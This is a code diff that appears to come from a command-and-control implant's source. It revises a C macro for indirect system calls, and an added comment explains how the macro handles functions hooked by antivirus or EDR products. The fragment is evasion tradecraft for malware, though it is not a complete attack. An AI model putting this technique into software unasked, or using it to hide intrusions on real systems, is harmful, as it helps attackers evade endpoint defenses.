@@ -9,15 +9,21 @@
 #define OPT
 #endif
 
-#define SYSCALL_INVOKE( SYS_NAME, ... )                                         \
-    if ( Instance.Config.Implant.SysIndirect && Instance.Syscall.SysAddress ) { \
-        SysConfig.Ssn = Instance.Syscall.SYS_NAME;                              \
-        SysConfig.Adr = Instance.Syscall.SysAddress;                            \
-        SysSetConfig( &SysConfig );                                             \
-        NtStatus = SysInvoke( __VA_ARGS__ );                                    \
-    } else {                                                                    \
-        NtStatus = Instance.Win32.SYS_NAME( __VA_ARGS__ );                      \
-    }                                                                           \
+/*
+ * TODO: if a function is hooked by an AV/EDR, Ssn will be 0x0
+ *       in that case, we will simply call the NtApi
+ *       this will of course trigger the hook, but is either that or we fail
+ *       we need to redesign this
+ */
+#define SYSCALL_INVOKE( SYS_NAME, ... )                                                                      \
+    if ( Instance.Config.Implant.SysIndirect && Instance.Syscall.SysAddress && Instance.Syscall.SYS_NAME ) { \
+        SysConfig.Ssn = Instance.Syscall.SYS_NAME;                                                           \
+        SysConfig.Adr = Instance.Syscall.SysAddress;                                                         \
+        SysSetConfig( &SysConfig );                                                                          \
+        NtStatus = SysInvoke( __VA_ARGS__ );                                                                 \
+    } else {                                                                                                 \
+        NtStatus = Instance.Win32.SYS_NAME( __VA_ARGS__ );                                                   \
+    }                                                                                                        \
     PRINTF( "%s( ... ) = %08x\n", #SYS_NAME, NtStatus )
 
 NTSTATUS NTAPI SysNtOpenThread(
